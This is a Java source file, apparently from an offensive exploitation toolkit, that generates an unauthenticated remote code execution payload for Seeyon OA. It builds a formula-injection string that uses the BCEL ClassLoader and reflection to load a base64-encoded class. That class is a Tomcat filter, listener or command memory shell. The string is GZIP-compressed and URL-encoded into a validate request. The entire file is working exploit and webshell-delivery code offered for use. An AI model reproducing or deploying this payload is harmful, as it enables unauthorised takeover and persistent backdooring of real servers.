package core.payloads;

import core.enumtypes.PayloadType;
import core.memshell.CommandMemShell;
import core.memshell.TomcatFilterMemShell;
import core.memshell.TomcatListenerMemShell;
import core.utils.Util;

import java.net.URLEncoder;

public class Seeyon_Unauthorized_RCE {
    public static Object getObject(PayloadType type, String trojanType) throws Exception {
        String payloadTemplate = "[{'formulaType': 1, 'formulaName': 'test', 'formulaExpression': 'String name1 = \"com.sun.org.apache.bcel.internal.util.Class\";\n" +
                "String name2 = \"Loader\";\n" +
                "Class clazz = Class.forName(name1 + name2);\n" +
                "java.lang.reflect.Constructor con = clazz.getConstructor();\n" +
                "Object obj = con.newInstance();\n" +
                "java.lang.reflect.Method me = clazz.getMethod(\"loadClass\", String.class);\n" +
                "me.invoke(obj,new String(new sun.misc.BASE64Decoder().decodeBuffer(\"{code}\"))).newInstance();};test();def static xxx(){'}, '', {}, 'true']";

        byte[] bytecodes = null;
        switch (type) {
            case tomcatfiltermemshell:
                bytecodes = utils.Util.getClassBytes(TomcatFilterMemShell.class);
                break;
            case tomcatlistenermemshell:
                bytecodes = utils.Util.getClassBytes(TomcatListenerMemShell.class);
                break;
            case commandmemshell:
                bytecodes = utils.Util.getClassBytes(CommandMemShell.class);
                break;
        }

        String bcelCodeStr = Util.base64Encode(utils.Util.generateBcelCode2(bytecodes).getBytes());
        String payloadTmp =  payloadTemplate.replace("{code}", bcelCodeStr);
        String payload = "managerMethod=validate&arguments=" + URLEncoder.encode(Util.GZIPCompress(payloadTmp), "UTF-8");
        return payload;
    }
    public static byte[] getByte(PayloadType type, String trojanType) throws Exception {
        String payload = (String) getObject(type, trojanType);
        return payload.getBytes();
    }
}
